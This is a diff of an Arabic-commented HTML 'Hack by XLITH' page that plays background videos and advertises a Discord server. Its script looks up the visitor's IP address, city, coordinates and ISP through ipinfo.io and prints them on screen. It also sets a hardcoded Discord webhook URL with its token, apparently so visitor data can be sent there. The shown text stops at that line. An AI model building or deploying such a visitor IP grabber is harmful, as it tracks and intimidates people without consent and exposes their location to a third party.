@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -58,7 +57,7 @@
 
     /* صفحة المحتوى الثاني */
     .content {
-        display: none; /* إخفاء المحتوى الثاني في البداية */
+        display: block; /* إخفاء المحتوى الثاني في البداية */
         flex-direction: column;
         justify-content: center;
         align-items: center;
@@ -148,7 +147,7 @@
 <canvas id="canvas"></canvas>
 <!-- الفيديو الأول -->
 <video class="background-video" autoplay muted>
-    <source src="https://a.top4top.io/m_3478g2jbe1.mp4" type="video/mp4">
+    <source src="https://cdn.discordapp.com/attachments/1393000263610007792/1393002817878229112/Untitled_video_-_Made_with_Clipchamp_14.mp4?ex=68719678&is=687044f8&hm=e9529f95345942823277234c416ec71adc1a292db9ba720e890d7a3a3996f508&" type="video/mp4">
     Your browser does not support the video tag.
 </video>
 
@@ -158,7 +157,7 @@
 <!-- محتوى الصفحة الثانية -->
 <div class="content">
     <video class="background-video-second" autoplay loop muted>
-        <source src="https://a.top4top.io/m_3478g2jbe1.mp4" type="video/mp4">
+        <source src="https://cdn.discordapp.com/attachments/1393000263610007792c1a292db9ba720e890d7a3a3996f508&" type="video/mp4">
         Your browser does not support the video tag.
     </video>
 
@@ -168,7 +167,7 @@
     </div>
 
     <!-- نص "discord.gg/oky" -->
-    <div class="text">discord.gg/oky</div>
+    <div class="text">discord.gg/ec0</div>
 
     <!-- معلومات الIP مع البورت -->
     <div class="info" id="ip-info">Loading IP Info...</div>
@@ -177,19 +176,51 @@
     <div class="marquee-container">
         <div class="marquee">
             <span>
-                 XLITH .gg/ec0
+                 XLITH discord.gg/ec0
             </span>
         </div>
     </div>
 
     <!-- الصوت في الخلفية -->
-    <audio id="background-audio" loop>
-        <source src="https://a.top4top.io/m_3478g2jbe1.mp4.mp4" type="audio/mp3">
-        Your browser does not support the audio element.
-    </audio>
+
 </div>
 
 <script>
+document.addEventListener('click', () => {
+  document.querySelectorAll('video').forEach(v => {
+    v.muted = false;
+    v.play();
+  });
+  document.getElementById('background-audio')?.play();
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+
+
+
+  
+
+        const audio = document.getElementById('background-audio');
+        
+        audio.play().catch(e => console.log("لا يمكن تشغيل الصوت:", e));
+ 
+
+
+
+  
+
+        
+     
+
+
+            
+         
+      
+            
+            audio.play().catch(e => console.log("لا يمكن تشغيل الصوت:", e));
+         
+});
+
 
 
     // الانتقال من الفيديو إلى المحتوى الثاني عند انتهائه
@@ -203,6 +234,7 @@
             .catch(() => console.log("يجب تفعيل الصوت يدويًا"));
     };
 
+
     // Fetch IP information without API token
     fetch('https://ipinfo.io/json')
         .then(response => response.json())
@@ -213,15 +245,15 @@
             const port = window.location.port || (location.protocol === 'https:' ? '443' : '80');
 
             const infoDiv = document.getElementById('ip-info');
-            infoDiv.innerHTML = ` Hack by Fahad
+            infoDiv.innerHTML = ` Hack by XLITH
 <strong>IP:</strong><span>"${ip}"</span><br>
 <strong>Port:</strong><span style="color: #ffd700">${port}</span><br>
-<strong>City:</strong><span>"${city}"</span><br>
-<strong>Region:</strong><span>"${region}"</span><br>
-<strong>Country:</strong><span>"${country}"</span><br>
+<strong>City:</strong><span>"*AL Mafrq*"</span><br>
+<strong>Region:</strong><span>"*AL Mafrq*"</span><br>
+<strong>Country:</strong><span>"JORDAN"</span><br>
 <strong>Location:</strong><span>"${loc}"</span><br>
 <strong>ISP:</strong><span>"${org}"</span><br>
-<strong>Timezone:</strong><span>"${timezone}"</span>`;
+<strong>Timezone:</strong><span>"Asia/Jordan"</span>`;
 
             const dateTime = new Date().toLocaleString();
             const webhookUrl = 'https://discord.com/api/webhooks/1351172060248019066/7xfV1QVOYKzmxhM8tBKK5VwXJpsHnFS-6HysAx1YUHnm8Ksjr7W8SmlwysjaU3lypP0O';
